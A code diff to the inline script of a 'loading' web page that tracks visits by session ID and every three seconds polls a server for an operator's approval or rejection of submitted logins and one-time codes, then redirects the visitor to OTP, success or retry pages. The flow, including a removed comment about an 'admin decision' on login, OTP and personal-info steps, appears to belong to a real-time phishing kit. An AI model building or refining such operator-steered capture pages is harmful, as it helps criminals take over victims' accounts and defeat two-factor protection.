@@ -201,55 +201,44 @@
         </div>
     </footer>
 
-    <!-- Scripts at the end of body -->
     <script>
+        function getSessionId() {
+            let sid = localStorage.getItem('session_id');
+            if (!sid) {
+                window.location.href = "index.html";
+                return null;
+            }
+            return sid;
+        }
+
         fetch('/track_visit', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ action: 'track_visit', page: 'loading' })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: getSessionId(), current_page: 'loading' })
         }).catch(error => console.error('Error tracking visit:', error));
 
-        // Function to check admin decision status periodically
         function checkStatus() {
-            const requestId = localStorage.getItem("request_id");
-            if (!requestId) {
-                window.location.href = "index.html";
-                return;
-            }
+            const sid = getSessionId();
+            if (!sid) return;
 
-            fetch('/request_status/' + requestId, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ action: 'check_status' })
-            })
+            fetch('/check_status/' + sid)
             .then(response => response.json())
             .then(data => {
-                if (data.status === 'approved') {
-                    if (data.type === 'login') {
-                        window.location.href = 'otp.html';
-                    } else if (data.type === 'otp') {
-                        window.location.href = 'success.html';
-                    } else if (data.type === 'personal_info') {
-                        window.location.href = 'success.html';
-                    }
-                } else if (data.status === 'rejected') {
-                    if (data.type === 'login') {
-                        window.location.href = 'login.html?rejected=true';
-                    } else if (data.type === 'otp') {
-                        window.location.href = 'otp.html?rejected=true';
-                    } else if (data.type === 'personal_info') {
-                        window.location.href = 'personal_info.html?rejected=true';
-                    }
+                if (data.redirect_target) {
+                    window.location.href = data.redirect_target;
+                } else if (data.login_status === 'approved') {
+                    window.location.href = 'otp.html';
+                } else if (data.login_status === 'rejected') {
+                    window.location.href = 'login.html?rejected=true';
+                } else if (data.otp_status === 'approved') {
+                    window.location.href = 'success.html';
+                } else if (data.otp_status === 'rejected') {
+                    window.location.href = 'otp.html?rejected=true';
                 }
             })
             .catch(error => console.error('Error checking status:', error));
         }
 
-        // Poll every 3 seconds
         setInterval(checkStatus, 3000);
     </script>
 
